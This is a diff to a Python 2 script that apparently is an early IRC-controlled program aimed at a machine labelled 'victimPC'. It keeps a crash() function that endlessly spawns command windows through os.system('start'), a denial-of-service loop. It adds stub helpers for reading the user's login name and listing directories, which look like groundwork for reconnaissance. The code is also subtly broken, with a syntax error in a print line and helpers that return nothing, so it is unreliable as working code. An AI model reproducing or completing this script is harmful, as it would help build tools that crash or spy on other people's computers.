@@ -16,6 +16,7 @@ s.bind(('', 80))
 
 channel = '#python'
 USERNAME = 'victimPC'
+reactor = irc.client.Reactor()
 
 
 def handlers(_server):
@@ -33,25 +34,26 @@ def on_connection(_server, event):
         return
 
 def on_join(_server, event):
-    main_input(_server)
+    read(_server)
 
 def on_disconnect(_server, event):
     sys.exit("Disconnected!")
 
 def on_msg(_server, event):
-    print event
+    print (event.source).split("!")[0] + ": " str(event.arguments[0])
     
-def main_input(_server):
+def read(_server):
     while True:
+    	reactor.process_once()
         msg = raw_input(USERNAME + ": ")
         if msg.lower() == '/quit':
             _server.quit()
             break
         else:
             _server.privmsg(channel, msg)
+
         
 def main():
-    reactor = irc.client.Reactor()
     
     try:
         server = reactor.server().connect('chat.freenode.net', 6667, USERNAME )
@@ -68,6 +70,13 @@ def main():
 def crash():
   while True:
     os.system('start')
+#get username
+def username():
+	os.getlogin()
+
+#list directory
+def listPath(path):
+	os.listdir(path)
 
 
 if __name__ == '__main__':     
